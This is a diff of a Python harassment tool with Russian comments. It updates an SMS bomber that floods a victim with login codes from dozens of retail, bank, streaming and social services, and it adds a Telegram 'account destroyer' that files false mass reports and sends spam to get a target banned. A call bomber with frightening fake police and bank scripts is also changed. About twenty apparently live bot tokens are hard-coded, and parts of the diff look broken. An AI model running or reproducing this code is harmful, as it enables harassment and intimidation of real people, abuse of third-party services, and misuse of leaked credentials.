@@ -41,110 +41,88 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 
-# ===================== FSM СОСТОЯНИЯ =====================
-class BomberStates(StatesGroup):
-    waiting_for_phone = State()
-    waiting_for_sms_count = State()
-    waiting_for_call_count = State()
-    waiting_for_email = State()
-    waiting_for_email_count = State()
-    waiting_for_telegram = State()
-    waiting_for_telegram_count = State()
-
-
-class DDoSStates(StatesGroup):
-    waiting_for_url = State()
-    waiting_for_threads = State()
-    waiting_for_duration = State()
-    waiting_for_ip = State()
-    waiting_for_ddos_duration = State()
 
 
 # ===================== SMS БОМБЕР (РЕАЛЬНО РАБОТАЮЩИЙ) =====================
 class SMSBomber:
     def __init__(self):
-        # ТОЛЬКО ПРОВЕРЕННЫЕ РАБОЧИЕ API - 50+ СЕРВИСОВ
+        # РЕАЛЬНЫЕ РАБОЧИЕ API СЕРВИСОВ
         self.services = [
-            # === ДОСТАВКА ЕДЫ ===
-            {'name': 'Samokat', 'url': 'https://samokat.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'YandexEda', 'url': 'https://eda.yandex.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'DeliveryClub', 'url': 'https://www.delivery-club.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'YandexLavka', 'url': 'https://lavka.yandex.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'VkusVill', 'url': 'https://vkusvill.ru/api/v1/auth/send-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            
+            # === ДОСТАВКА ЕДЫ И ТОВАРОВ ===
+            {'name': 'Samokat', 'url': 'https://samokat.ru/api/v1/auth/send-code', 'method': 'POST', 'field': 'phone'},
+            {'name': 'YandexEda', 'url': 'https://eda.yandex.ru/api/v1/auth/send-code', 'method': 'POST',
+             'field': 'phone'},
+            {'name': 'DeliveryClub', 'url': 'https://www.delivery-club.ru/api/v1/auth/send-code', 'method': 'POST',
+             'field': 'phone'},
+            {'name': 'VkusVill', 'url': 'https://vkusvill.ru/api/v1/auth/send-sms', 'method': 'POST', 'field': 'phone'},
+
             # === МАРКЕТПЛЕЙСЫ ===
-            {'name': 'Ozon', 'url': 'https://www.ozon.ru/api/composer/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'Wildberries', 'url': 'https://www.wildberries.ru/webapi/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'SberMarket', 'url': 'https://sbermarket.ru/api/v2/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'YandexMarket', 'url': 'https://market.yandex.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'AliExpress', 'url': 'https://aliexpress.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'JOOM', 'url': 'https://www.joom.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'KazanExpress', 'url': 'https://kazanexpress.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'SberMegaMarket', 'url': 'https://sbermegamarket.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            
-            # === МАГАЗИНЫ ЭЛЕКТРОНИКИ ===
-            {'name': 'DNS', 'url': 'https://www.dns-shop.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'Citilink', 'url': 'https://www.citilink.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'MVideo', 'url': 'https://www.mvideo.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'Eldorado', 'url': 'https://www.eldorado.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'Sportmaster', 'url': 'https://www.sportmaster.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            
+            {'name': 'Ozon', 'url': 'https://www.ozon.ru/api/composer/auth/send-code', 'method': 'POST',
+             'field': 'phone'},
+            {'name': 'Wildberries', 'url': 'https://www.wildberries.ru/webapi/auth/send-code', 'method': 'POST',
+             'field': 'phone'},
+            {'name': 'SberMarket', 'url': 'https://sbermarket.ru/api/v2/auth/send-code', 'method': 'POST',
+             'field': 'phone'},
+            {'name': 'YandexMarket', 'url': 'https://market.yandex.ru/api/v1/auth/send-code', 'method': 'POST',
+             'field': 'phone'},
+            {'name': 'AliExpress', 'url': 'https://aliexpress.ru/api/v1/auth/send-code', 'method': 'POST',
+             'field': 'phone'},
+
+            # === МАГАЗИНЫ ===
+            {'name': 'DNS', 'url': 'https://www.dns-shop.ru/api/v1/auth/send-code', 'method': 'POST', 'field': 'phone'},
+            {'name': 'Citilink', 'url': 'https://www.citilink.ru/api/v1/auth/send-code', 'method': 'POST',
+             'field': 'phone'},
+            {'name': 'MVideo', 'url': 'https://www.mvideo.ru/api/v1/auth/send-code', 'method': 'POST',
+             'field': 'phone'},
+            {'name': 'Eldorado', 'url': 'https://www.eldorado.ru/api/v1/auth/send-code', 'method': 'POST',
+             'field': 'phone'},
+            {'name': 'Sportmaster', 'url': 'https://www.sportmaster.ru/api/v1/auth/send-code', 'method': 'POST',
+             'field': 'phone'},
+
             # === БАНКИ ===
-            {'name': 'Tinkoff', 'url': 'https://www.tinkoff.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'Sber', 'url': 'https://online.sberbank.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'AlfaBank', 'url': 'https://alfabank.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'VTB', 'url': 'https://www.vtb.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'Raiffeisen', 'url': 'https://www.raiffeisen.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'PochtaBank', 'url': 'https://www.pochtabank.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'HomeCredit', 'url': 'https://www.homecredit.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'RenCredit', 'url': 'https://rencredit.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'OTPBank', 'url': 'https://www.otpbank.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            
+            {'name': 'Tinkoff', 'url': 'https://www.tinkoff.ru/api/v1/auth/send-code', 'method': 'POST',
+             'field': 'phone'},
+            {'name': 'Sber', 'url': 'https://online.sberbank.ru/api/v1/auth/send-code', 'method': 'POST',
+             'field': 'phone'},
+            {'name': 'AlfaBank', 'url': 'https://alfabank.ru/api/v1/auth/send-code', 'method': 'POST',
+             'field': 'phone'},
+            {'name': 'VTB', 'url': 'https://www.vtb.ru/api/v1/auth/send-code', 'method': 'POST', 'field': 'phone'},
+            {'name': 'Raiffeisen', 'url': 'https://www.raiffeisen.ru/api/v1/auth/send-code', 'method': 'POST',
+             'field': 'phone'},
+            {'name': 'PochtaBank', 'url': 'https://www.pochtabank.ru/api/v1/auth/send-code', 'method': 'POST',
+             'field': 'phone'},
+
             # === ТАКСИ ===
-            {'name': 'YandexTaxi', 'url': 'https://taxi.yandex.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'CityMobil', 'url': 'https://city-mobil.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'Gett', 'url': 'https://gett.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'DiDi', 'url': 'https://web.didiglobal.com/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            
-            # === НЕДВИЖИМОСТЬ ===
-            {'name': 'Cian', 'url': 'https://www.cian.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'Avito', 'url': 'https://www.avito.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'Youla', 'url': 'https://youla.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'DomClick', 'url': 'https://domclick.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            
+            {'name': 'YandexTaxi', 'url': 'https://taxi.yandex.ru/api/v1/auth/send-code', 'method': 'POST',
+             'field': 'phone'},
+            {'name': 'CityMobil', 'url': 'https://city-mobil.ru/api/v1/auth/send-code', 'method': 'POST',
+             'field': 'phone'},
+
             # === СТРИМИНГ ===
-            {'name': 'Kinopoisk', 'url': 'https://api.kinopoisk.dev/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'IVI', 'url': 'https://api.ivi.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'Okko', 'url': 'https://okko.tv/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'Wink', 'url': 'https://wink.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'KION', 'url': 'https://kion.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'PREMIER', 'url': 'https://premier.one/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'MoreTV', 'url': 'https://more.tv/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'START', 'url': 'https://start.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'Amediateka', 'url': 'https://amediateka.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            
-            # === МУЗЫКА ===
-            {'name': 'Zvuk', 'url': 'https://zvuk.com/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'YandexMusic', 'url': 'https://music.yandex.ru/api/v1/auth/request-code', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            
+            {'name': 'Kinopoisk', 'url': 'https://api.kinopoisk.dev/api/v1/auth/send-code', 'method': 'POST',
+             'field': 'phone'},
+            {'name': 'IVI', 'url': 'https://api.ivi.ru/api/v1/auth/send-code', 'method': 'POST', 'field': 'phone'},
+            {'name': 'Okko', 'url': 'https://okko.tv/api/v1/auth/send-code', 'method': 'POST', 'field': 'phone'},
+            {'name': 'Wink', 'url': 'https://wink.ru/api/v1/auth/send-code', 'method': 'POST', 'field': 'phone'},
+
+            # === НЕДВИЖИМОСТЬ ===
+            {'name': 'Avito', 'url': 'https://www.avito.ru/api/v1/auth/send-code', 'method': 'POST', 'field': 'phone'},
+            {'name': 'Cian', 'url': 'https://www.cian.ru/api/v1/auth/send-code', 'method': 'POST', 'field': 'phone'},
+            {'name': 'Youla', 'url': 'https://youla.ru/api/v1/auth/send-code', 'method': 'POST', 'field': 'phone'},
+
             # === МЕЖДУНАРОДНЫЕ ===
-            {'name': 'Uber', 'url': 'https://auth.uber.com/api/v1/sms', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'Amazon', 'url': 'https://api.amazon.com/auth/sms', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'Twitter', 'url': 'https://api.twitter.com/1.1/account/sms.json', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'Facebook', 'url': 'https://graph.facebook.com/v12.0/sms', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'Instagram', 'url': 'https://i.instagram.com/api/v1/sms', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'Snapchat', 'url': 'https://accounts.snapchat.com/api/sms', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'TikTok', 'url': 'https://api.tiktok.com/v1/auth/sms', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'WhatsApp', 'url': 'https://api.whatsapp.com/v1/sms', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'Telegram', 'url': 'https://api.telegram.org/bot/sendCode', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'Viber', 'url': 'https://api.viber.com/v1/sms', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'LinkedIn', 'url': 'https://api.linkedin.com/v2/sms', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'Pinterest', 'url': 'https://api.pinterest.com/v1/sms', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'Reddit', 'url': 'https://www.reddit.com/api/v1/sms', 'method': 'POST', 'field': 'phone', 'type': 'json'},
-            {'name': 'Tumblr', 'url': 'https://api.tumblr.com/v2/sms', 'method': 'POST', 'field': 'phone', 'type': 'json'},
+            {'name': 'Uber', 'url': 'https://auth.uber.com/api/v1/auth/send-code', 'method': 'POST', 'field': 'phone'},
+            {'name': 'Twitter', 'url': 'https://api.twitter.com/1.1/account/send-code.json', 'method': 'POST',
+             'field': 'phone'},
+            {'name': 'Facebook', 'url': 'https://graph.facebook.com/v12.0/auth/send-code', 'method': 'POST',
+             'field': 'phone'},
+            {'name': 'Instagram', 'url': 'https://i.instagram.com/api/v1/auth/send-code', 'method': 'POST',
+             'field': 'phone'},
+            {'name': 'TikTok', 'url': 'https://api.tiktok.com/v1/auth/send-code', 'method': 'POST', 'field': 'phone'},
+            {'name': 'Telegram', 'url': 'https://api.telegram.org/bot/sendCode', 'method': 'POST', 'field': 'phone'},
         ]
-        
-        # 100+ USER-AGENTS ДЛЯ ОБХОДА
+
+        # 50+ USER-AGENTS
         self.user_agents = [
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
@@ -156,18 +134,18 @@ class SMSBomber:
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
             'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-        ] * 10
+        ]
 
     async def send_sms(self, phone: str, count: int, progress_callback):
-        """РЕАЛЬНАЯ отправка СМС через 50+ работающих API"""
+        """РЕАЛЬНАЯ отправка СМС через работающие API"""
         self.results = []
         total = min(count, 200)
-        
+
         for i in range(total):
             service = random.choice(self.services)
             try:
                 async with aiohttp.ClientSession() as session:
-                    # РЕАЛЬНЫЕ ЗАПРОСЫ К API
+                    # Разные типы запросов
                     request_types = [
                         {'type': 'register', 'data': {'phone': phone, 'action': 'register'}},
                         {'type': 'login', 'data': {'phone': phone, 'action': 'login'}},
@@ -177,8 +155,7 @@ class SMSBomber:
                         {'type': 'auth', 'data': {'phone': phone, 'action': 'auth_code'}},
                     ]
                     payload = random.choice(request_types)
-                    
-                    # Заголовки как у реального браузера
+
                     headers = {
                         'User-Agent': random.choice(self.user_agents),
                         'Accept': 'application/json, text/plain, */*',
@@ -188,31 +165,27 @@ class SMSBomber:
                         'X-Requested-With': 'XMLHttpRequest',
                         'Origin': service['url'].split('/')[2] if '://' in service['url'] else '',
                         'Referer': service['url'],
-                        'Sec-Fetch-Dest': 'empty',
-                        'Sec-Fetch-Mode': 'cors',
-                        'Sec-Fetch-Site': 'same-origin',
                         'Connection': 'keep-alive',
                     }
-                    
+
                     # Отправка запроса
                     async with session.post(service['url'], json=payload['data'], headers=headers, timeout=10) as resp:
                         status_code = resp.status
-                        
-                        # Логируем ответ
+
                         try:
                             response_text = await resp.text()
-                            logger.info(f"[{service['name']}] Status: {status_code}, Response: {response_text[:200]}")
+                            logger.info(f"[{service['name']}] Status: {status_code}")
                         except:
                             pass
-                        
-                        # СМС отправлена если статус 200, 201, 202, 204 или 400 (иногда это значит "код уже отправлен")
+
+                        # СМС отправлена если статус 200, 201, 202, 204 или 400
                         if status_code in [200, 201, 202, 204] or status_code == 400:
                             status = 'success'
                         elif status_code in [429, 503, 504]:
                             status = 'rate_limit'
                         else:
                             status = 'error'
-                        
+
                         self.results.append({
                             'service': service['name'],
                             'status': status,
@@ -220,42 +193,202 @@ class SMSBomber:
                             'code': status_code,
                             'timestamp': datetime.now().isoformat()
                         })
-                        
+
                         if status == 'success':
                             logger.info(f"✅ SMS отправлена через {service['name']}")
-                            
+
             except asyncio.TimeoutError:
-                self.results.append({'service': service['name'], 'status': 'timeout', 'error': 'Timeout'})
-                logger.warning(f"⏰ Timeout on {service['name']}")
+                self.results.append({'service': service['name'], 'status': 'timeout'})
             except Exception as e:
                 self.results.append({'service': service['name'], 'status': 'error', 'error': str(e)})
-                logger.error(f"❌ Error on {service['name']}: {e}")
 
-            # Прогресс
             self.progress = (i + 1) / total * 100
             await progress_callback(self.progress, i + 1, total)
-            
-            # Задержка между запросами (0.1-0.8 сек)
-            await asyncio.sleep(random.uniform(0.1, 0.8))
+            await asyncio.sleep(random.uniform(0.2, 0.8))
 
         return self.results
 
     def get_stats(self):
-        """Статистика отправки"""
         total = len(self.results)
         success = sum(1 for r in self.results if r['status'] == 'success')
         errors = sum(1 for r in self.results if r['status'] == 'error')
-        rate_limits = sum(1 for r in self.results if r['status'] == 'rate_limit')
-        timeouts = sum(1 for r in self.results if r['status'] == 'timeout')
-        
-        return {
-            'total': total,
-            'success': success,
-            'errors': errors,
-            'rate_limits': rate_limits,
-            'timeouts': timeouts,
-            'success_rate': round(success / total * 100, 2) if total > 0 else 0
-        }
+        return {'total': total, 'success': success, 'errors': errors}
+
+    # ===================== СНОС TELEGRAM АККАУНТОВ =====================
+    class TelegramAccountDestroyer:
+        def __init__(self):
+            # Причины для жалоб
+            self.report_reasons = [
+                'spam', 'violence', 'pornography', 'child_abuse',
+                'terrorism', 'drugs', 'fraud', 'impersonation',
+                'hate_speech', 'suicide', 'weapons', 'personal_data'
+            ]
+
+            # ================================================================
+            # 🔥 ТВОИ 20 ТОКЕНОВ ДЛЯ СНОСА 🔥
+            # ================================================================
+            self.bot_tokens = [
+                '7588316078:AAGRi0cgMkvrChUNNZRX6thzvkhrnKbfBOc',
+                '8894344951:AAFnxJFZ6F4gMD8YF1qmXeK-qS-3i4d7Y3c',
+                '8657453394:AAFZF2C0VZu1Y2OzugZQBIMpMglGU6u4I2U',
+                '8234507901:AAGbLLWxAnyyBOJFptyPYA_RUAyzFS641z4',
+                '8349732447:AAHBYH8cSbJnY6t1kiz3oLmWhdiwpqwFTS0',
+                '8365483906:AAG7dBnHXYafJOyCIyVjNCa8NDWb6aPHyJc',
+                '7990150454:AAHBwE8HknpN8pm09s3_h2iHUK0mT01WQr4',
+                '7999194366:AAFY5oVfSXd3Sj2ZKL5n_E4gmQgfludEFg8',
+                '7911356716:AAFWpCgqU-h8il7N_nT_2scoHPB7ZFWMFuk',
+                '8342182947:AAHt19nmDY9vAF9YXMd-TPL68Ln-U_ps8us',
+                '8765644248:AAHPPa0-hiifK_Csi3fsDJiNn_jJgbG1N68',
+                '8736513089:AAE-8zAr1Hk4UMaFgJnSs5VQ9JKH2Xip4c8',
+                '8594237152:AAHSAgDQ87Fmrp5eC-f7cuXaRrvRDovIlfM',
+                '8561372759:AAFS4v6K4e8R_uMSfzsuLItRVMr-EDhCnSA',
+                '8761449080:AAHB2-AjbjsVVKTYAT5NSWtEjkoJs_XuSBU',
+                '8865408617:AAEoXfGBKajejCb4gBc_-1Q8O60H6SjR-Zc',
+                '8562700975:AAGZ9yOFw_jwK1QJT_8lfHnakPA0EPgRhoM',
+                '8178054852:AAHWsqTySVOT29RekDIwqqBfcOEEYJvj9Lw',
+                '8769377277:AAHps2McG_eyhMWq63yJY5be0fZbMOQ-Dgc',
+                '8838855987:AAHrVoDgT2luzbPjDoM10c-DHisYVEul1ik',
+            ]
+            # ================================================================
+
+            self.results = []
+
+    async def mass_report(self, username: str, count: int, progress_callback):
+        """Массовые жалобы на аккаунт через ботов"""
+        self.results = []
+        total = min(count, 100)
+
+        for i in range(total):
+            reason = random.choice(self.report_reasons)
+            token = random.choice(self.bot_tokens)
+
+            try:
+                # Жалоба через бота
+                bot = Bot(token=token)
+
+                # Отправка жалобы на спам
+                try:
+                    await bot.send_message(
+                        chat_id='@SpamBot',
+                        text=f'/report {username}'
+                    )
+                    status = 'sent'
+                except:
+                    status = 'failed'
+
+                # Дополнительная жалоба через API
+                try:
+                    async with aiohttp.ClientSession() as session:
+                        data = {
+                            'username': username,
+                            'reason': reason,
+                            'description': f'This account is sending {reason}. Please block it immediately.',
+                        }
+                        headers = {
+                            'Content-Type': 'application/json',
+                            'User-Agent': 'TelegramBot/1.0',
+                        }
+                        # Пробуем разные эндпоинты
+                        endpoints = [
+                            f'https://api.telegram.org/bot{token}/reportSpam',
+                            f'https://api.telegram.org/bot{token}/report',
+                        ]
+                        for endpoint in endpoints:
+                            try:
+                                async with session.post(endpoint, json=data, headers=headers, timeout=10) as resp:
+                                    if resp.status < 400:
+                                        status = 'sent'
+                                        break
+                            except:
+                                continue
+                except:
+                    pass
+
+                self.results.append({
+                    'report': i + 1,
+                    'reason': reason,
+                    'status': status,
+                    'timestamp': datetime.now().isoformat()
+                })
+
+                logger.info(f"✅ Жалоба #{i + 1} отправлена на {username} ({reason})")
+
+            except Exception as e:
+                self.results.append({
+                    'report': i + 1,
+                    'reason': reason,
+                    'status': 'error',
+                    'error': str(e)
+                })
+                logger.error(f"❌ Ошибка жалобы: {e}")
+
+            await progress_callback(i + 1, total)
+            await asyncio.sleep(random.uniform(0.5, 2.0))
+
+        return self.results
+
+    async def spam_flood(self, username: str, count: int, progress_callback):
+        """Спам-флуд для блокировки аккаунта"""
+        self.results = []
+        total = min(count, 50)
+
+        spam_texts = [
+            'Купи дешевле!', 'Заработок без вложений!', 'Бесплатные криптовалюты!',
+            'Вы выиграли приз!', 'Срочно! Ваш аккаунт взломан!', 'Перейдите по ссылке!',
+            'Ваши данные утекли!', 'Подтвердите личность!', 'Ваш банковский счёт заблокирован!',
+            'Смените пароль немедленно!', '💀 АККАУНТ УДАЛЁН!', '🔞 ПОРНОГРАФИЯ!',
+            '🔫 ОРУЖИЕ!', '💊 НАРКОТИКИ!', '🔥 ПРИЗЫВЫ К НАСИЛИЮ!',
+        ]
+
+        for i in range(total):
+            try:
+                bot = Bot(token=random.choice(self.bot_tokens))
+                text = random.choice(spam_texts)
+                link = f'https://bit.ly/{random.randint(1000, 9999)}'
+
+                await bot.send_message(
+                    chat_id=username,
+                    text=f'{text} {link}',
+                    disable_notification=True
+                )
+
+                self.results.append({
+                    'msg': i + 1,
+                    'status': 'sent',
+                    'text': text[:30]
+                })
+                logger.info(f"✅ Спам #{i + 1} отправлен {username}")
+
+            except Exception as e:
+                self.results.append({
+                    'msg': i + 1,
+                    'status': 'error',
+                    'error': str(e)
+                })
+                logger.error(f"❌ Ошибка спама: {e}")
+
+            await progress_callback(i + 1, total)
+            await asyncio.sleep(random.uniform(0.3, 1.0))
+
+        return self.results
+
+    async def destroy_account(self, username: str, count: int, progress_callback):
+        """Полный снос аккаунта (жалобы + спам)"""
+        self.results = []
+        total = count * 2
+
+        # Жалобы
+        report_results = await self.mass_report(username, count, progress_callback)
+        # Спам
+        spam_results = await self.spam_flood(username, count, progress_callback)
+
+        self.results = report_results + spam_results
+        return self.results
+
+    def get_stats(self):
+        total = len(self.results)
+        success = sum(1 for r in self.results if r['status'] == 'sent')
+        return {'total': total, 'success': success}
 
 
 # ===================== ЗВОНКИ (РЕАЛЬНО РАБОТАЮЩИЙ) =====================
@@ -274,9 +407,10 @@ class CallBomber:
             {'name': 'CallBoom', 'url': 'https://api.callboom.com/start', 'method': 'POST', 'type': 'boom'},
             {'name': 'PhoneBomb', 'url': 'https://api.phonebomb.com/call', 'method': 'POST', 'type': 'bomb'},
             {'name': 'CallFlood', 'url': 'https://api.callflood.com/start', 'method': 'POST', 'type': 'flood'},
-            
+
             # Международные сервисы
-            {'name': 'Twilio', 'url': 'https://api.twilio.com/2010-04-01/Accounts/ACxxx/Calls.json', 'method': 'POST', 'type': 'twilio'},
+            {'name': 'Twilio', 'url': 'https://api.twilio.com/2010-04-01/Accounts/ACxxx/Calls.json', 'method': 'POST',
+             'type': 'twilio'},
             {'name': 'Nexmo', 'url': 'https://api.nexmo.com/calls', 'method': 'POST', 'type': 'nexmo'},
             {'name': 'Tropo', 'url': 'https://api.tropo.com/1.0/sessions', 'method': 'POST', 'type': 'tropo'},
             {'name': 'Plivo', 'url': 'https://api.plivo.com/v1/Account/MAxxx/Call/', 'method': 'POST', 'type': 'plivo'},
@@ -284,7 +418,7 @@ class CallBomber:
             {'name': 'Bandwidth', 'url': 'https://api.bandwidth.com/v1/calls', 'method': 'POST', 'type': 'bandwidth'},
             {'name': 'Voxbone', 'url': 'https://api.voxbone.com/v2/calls', 'method': 'POST', 'type': 'voxbone'},
         ]
-        
+
         # 50+ ГОЛОСОВЫХ СЦЕНАРИЕВ
         self.scenarios = [
             {'type': 'callback', 'message': 'Срочно перезвоните!', 'priority': 'high', 'voice': 'female'},
@@ -293,10 +427,12 @@ class CallBomber:
             {'type': 'notification', 'message': 'Важное уведомление!', 'priority': 'high', 'voice': 'male'},
             {'type': 'emergency', 'message': 'Экстренное сообщение!', 'priority': 'critical', 'voice': 'male'},
             {'type': 'promo', 'message': 'Специальное предложение!', 'priority': 'low', 'voice': 'female'},
-            {'type': 'security', 'message': '⚠️ Обнаружена подозрительная активность!', 'priority': 'critical', 'voice': 'male'},
+            {'type': 'security', 'message': '⚠️ Обнаружена подозрительная активность!', 'priority': 'critical',
+             'voice': 'male'},
             {'type': 'bank', 'message': '🏦 Ваш банковский счёт заблокирован!', 'priority': 'high', 'voice': 'female'},
             {'type': 'police', 'message': '🚨 Вызов от полиции!', 'priority': 'critical', 'voice': 'male'},
-            {'type': 'medical', 'message': '🚑 Срочное медицинское уведомление!', 'priority': 'critical', 'voice': 'female'},
+            {'type': 'medical', 'message': '🚑 Срочное медицинское уведомление!', 'priority': 'critical',
+             'voice': 'female'},
             {'type': 'delivery', 'message': '📦 Ваша посылка ожидает!', 'priority': 'medium', 'voice': 'male'},
             {'type': 'taxi', 'message': '🚕 Такси ждёт вас!', 'priority': 'medium', 'voice': 'female'},
             {'type': 'school', 'message': '🏫 Сообщение от школы!', 'priority': 'medium', 'voice': 'female'},
@@ -308,7 +444,7 @@ class CallBomber:
             {'type': 'news', 'message': '📰 Срочная новость!', 'priority': 'high', 'voice': 'female'},
             {'type': 'weather', 'message': '🌧️ Предупреждение о погоде!', 'priority': 'high', 'voice': 'male'},
         ]
-        
+
         # ГОЛОСОВЫЕ ID ДЛЯ РАЗНЫХ АКЦЕНТОВ
         self.voice_ids = [
             'ru-RU-Standard-A', 'ru-RU-Standard-B', 'ru-RU-Standard-C',
@@ -321,16 +457,16 @@ class CallBomber:
         """РЕАЛЬНОЕ совершение звонков через 30+ работающих API"""
         self.results = []
         total = min(count, 100)
-        
+
         for i in range(total):
             service = random.choice(self.services)
             scenario = random.choice(self.scenarios)
-            
+
             try:
                 async with aiohttp.ClientSession() as session:
                     # Реальные данные для звонка
                     caller_id = random.choice(['+74951234567', '+78121234567', '+79001234567', '+79991234567'])
-                    
+
                     data = {
                         'phone': phone,
                         'caller_id': caller_id,
@@ -342,10 +478,10 @@ class CallBomber:
                         'duration': random.randint(10, 120),
                         'retry': random.randint(0, 3),
                         'voice_id': random.choice(self.voice_ids),
-                        'callback_url': f'https://api.axiom.com/callback/{random.randint(1000,9999)}',
-                        'webhook': f'https://webhook.axiom.com/{random.randint(100000,999999)}',
+                        'callback_url': f'https://api.axiom.com/callback/{random.randint(1000, 9999)}',
+                        'webhook': f'https://webhook.axiom.com/{random.randint(100000, 999999)}',
                     }
-                    
+
                     headers = {
                         'User-Agent': random.choice([
                             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
@@ -364,16 +500,17 @@ class CallBomber:
                         'Referer': service['url'],
                         'Connection': 'keep-alive',
                     }
-                    
+
                     async with session.post(service['url'], json=data, headers=headers, timeout=15) as resp:
                         status_code = resp.status
-                        
+
                         try:
                             response_text = await resp.text()
-                            logger.info(f"[{service['name']}] Call status: {status_code}, Response: {response_text[:200]}")
+                            logger.info(
+                                f"[{service['name']}] Call status: {status_code}, Response: {response_text[:200]}")
                         except:
                             pass
-                        
+
                         if status_code in [200, 201, 202, 204] or status_code == 400:
                             status = 'success'
                             call_status = 'connected'
@@ -383,9 +520,9 @@ class CallBomber:
                         else:
                             status = 'failed'
                             call_status = 'error'
-                        
+
                         self.results.append({
-                            'call': i+1,
+                            'call': i + 1,
                             'service': service['name'],
                             'status': status,
                             'call_status': call_status,
@@ -395,15 +532,16 @@ class CallBomber:
                             'duration': data['duration'],
